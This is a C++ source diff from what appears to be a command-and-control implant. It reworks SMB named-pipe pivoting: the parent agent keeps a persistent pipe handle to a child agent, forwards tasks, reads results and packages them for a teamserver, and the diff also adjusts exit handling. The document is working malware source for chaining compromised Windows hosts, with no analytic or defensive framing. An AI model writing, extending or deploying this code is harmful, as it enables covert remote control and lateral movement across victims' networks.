@@ -31,7 +31,8 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
             }
             Self->Jbs->Send( Self->Jbs->PostJobs );
         } else if ( Self->Tsp->Pipe.Name ) {
-            // SMB: must always send PostJobs to close the pipe from Call 1
+            // SMB: must always send PostJobs (Call 2) to complete the read/write cycle
+            // and reset TasksRead flag for the next iteration
             Self->Jbs->Send( Self->Jbs->PostJobs );
         }
 
@@ -803,7 +804,7 @@ auto DECLFN Task::Pivot(
             break;
         }
         case Action::Pivot::Exchange: {
-            // Relay task data to SMB child and read response
+            // Relay task data to SMB child and read response using persistent handle
             PCHAR PivotId = Self->Psr->Str( Parser, 0 );
             ULONG DataLen = 0;
             PBYTE Data    = Self->Psr->Bytes( Parser, &DataLen );
@@ -815,76 +816,55 @@ auto DECLFN Task::Pivot(
 
             Self->Ntdll.DbgPrint( "[PIVOT] Exchange: pivotId=%s, data=%d bytes\n", PivotId, DataLen );
 
-            // Get specific child by its AgentId (server sends ChildAgentId as PivotId)
+            // Get child by AgentId — handle was stored during Link (SmbAdd)
             SMB_PROFILE_DATA* Child = (SMB_PROFILE_DATA*)Self->Tsp->SmbGet( PivotId );
-            if ( ! Child || ! Child->PipePath ) {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child not found for id=%s\n", PivotId );
+            if ( ! Child || ! Child->Handle ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child not found or handle null for id=%s\n", PivotId );
                 break;
             }
 
-            // Close old handle — child closes its pipe after each exchange and recreates it
-            if ( Child->Handle ) {
-                Self->Ntdll.NtClose( Child->Handle );
-                Child->Handle = nullptr;
-            }
-
-            // Connect to child's NEW pipe (child is waiting on ConnectNamedPipe)
-            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: connecting to %s\n", Child->PipePath );
-
-            HANDLE hPipe = Self->Krnl32.CreateFileA(
-                Child->PipePath,
-                GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr
-            );
-
-            if ( hPipe == INVALID_HANDLE_VALUE || ! hPipe ) {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: CreateFileA failed: %d\n", KhGetError );
-                break;
-            }
-
-            Child->Handle = hPipe;
-
-            // Write [4B len][data] as SINGLE message for PIPE_TYPE_MESSAGE
+            // Write tasks to persistent handle [4B len][data]
             ULONG TotalWriteLen = sizeof(ULONG) + DataLen;
             PBYTE WriteBuf = (PBYTE)KhAlloc( TotalWriteLen );
-            if ( ! WriteBuf ) {
-                Self->Ntdll.NtClose( hPipe );
-                Child->Handle = nullptr;
-                break;
-            }
+            if ( ! WriteBuf ) break;
             Mem::Copy( WriteBuf, &DataLen, sizeof(ULONG) );
             Mem::Copy( WriteBuf + sizeof(ULONG), Data, DataLen );
             ULONG WriteLen = 0;
-            BOOL writeOk = Self->Krnl32.WriteFile( hPipe, WriteBuf, TotalWriteLen, &WriteLen, nullptr );
+            BOOL writeOk = Self->Krnl32.WriteFile( Child->Handle, WriteBuf, TotalWriteLen, &WriteLen, nullptr );
             KhFree( WriteBuf );
             if ( ! writeOk ) {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: WriteFile failed: %d\n", KhGetError );
-                Self->Ntdll.NtClose( hPipe );
-                Child->Handle = nullptr;
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: WriteFile failed: %d — removing child\n", KhGetError );
+                Self->Tsp->SmbRm( Child );
                 break;
             }
 
             Self->Ntdll.DbgPrint( "[PIVOT] Exchange: wrote %d bytes tasks to child\n", DataLen );
 
-            // Step 2: Read child's results [4B len][response]
-            // Wait for child to process and write back
+            // Read child's results from same persistent handle
+            // Wait for child to process tasks and write back
             ULONG PeekLen = 0;
-            ULONG retries = 0;
-            while ( retries < 100 ) {
-                if ( Self->Krnl32.PeekNamedPipe( hPipe, nullptr, 0, 0, &PeekLen, 0 ) && PeekLen >= 4 ) {
-                    break;
+            while ( TRUE ) {
+                if ( ! Self->Krnl32.PeekNamedPipe( Child->Handle, nullptr, 0, 0, &PeekLen, 0 ) ) {
+                    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: PeekNamedPipe failed (child disconnected): %d\n", KhGetError );
+                    Self->Tsp->SmbRm( Child );
+                    goto exchange_done;
                 }
+                if ( PeekLen >= sizeof(ULONG) ) break;
                 Self->Krnl32.Sleep( 100 );
-                retries++;
             }
 
-            PBYTE RespBuf = nullptr;
-            ULONG RespLen = 0;
+            {
+                PBYTE RespBuf = nullptr;
+                ULONG RespLen = 0;
 
-            if ( PeekLen >= 4 ) {
-                // Read entire message at once (PIPE_TYPE_MESSAGE)
                 PBYTE MsgBuf = (PBYTE)KhAlloc( PeekLen );
                 ULONG ReadLen = 0;
-                Self->Krnl32.ReadFile( hPipe, MsgBuf, PeekLen, &ReadLen, nullptr );
+                if ( ! Self->Krnl32.ReadFile( Child->Handle, MsgBuf, PeekLen, &ReadLen, nullptr ) ) {
+                    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: ReadFile failed: %d — removing child\n", KhGetError );
+                    KhFree( MsgBuf );
+                    Self->Tsp->SmbRm( Child );
+                    goto exchange_done;
+                }
 
                 // Extract payload: skip 4-byte length prefix
                 if ( ReadLen > sizeof(ULONG) ) {
@@ -895,24 +875,18 @@ auto DECLFN Task::Pivot(
                 KhFree( MsgBuf );
 
                 Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child response = %d bytes\n", RespLen );
-            } else {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: timeout waiting for child response\n" );
+
+                // Handle stays open — persistent connection
+
+                // Package child response for teamserver
+                if ( RespBuf && RespLen > 0 ) {
+                    Self->Pkg->Int32( Package, PROFILE_SMB );
+                    Self->Pkg->Bytes( Package, RespBuf, RespLen );
+                    KhFree( RespBuf );
+                }
             }
 
-            // Close pipe
-            Self->Ntdll.NtClose( hPipe );
-            Child->Handle = nullptr;
-
-            // Package child response for teamserver
-            if ( RespBuf && RespLen > 0 ) {
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: Package before: buf=%p len=%d\n", Package->Buffer, Package->Length );
-                Self->Pkg->Int32( Package, PROFILE_SMB );
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: after Int32: buf=%p len=%d\n", Package->Buffer, Package->Length );
-                Self->Pkg->Bytes( Package, RespBuf, RespLen );
-                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: after Bytes: buf=%p len=%d (resp=%d)\n", Package->Buffer, Package->Length, RespLen );
-                KhFree( RespBuf );
-            }
-
+        exchange_done:
             break;
         }
     }
@@ -1923,9 +1897,8 @@ auto DECLFN Task::Exit(
     Job->State    = KH_JOB_READY_SEND;
     Job->ExitCode = EXIT_SUCCESS;
 
-    // For SMB: skip manual Send — it creates a new pipe and blocks forever
-    // on ConnectNamedPipe, preventing RtlExitUserProcess from executing.
-    // The Dispatcher's FinalRoutine will handle the final Send.
+    // For SMB: skip manual Send — FinalRoutine handles the final Send.
+    // This avoids any timing issues during exit.
     if ( ! Self->Tsp->Pipe.Name ) {
         Self->Jbs->Send( Self->Jbs->PostJobs );
     }
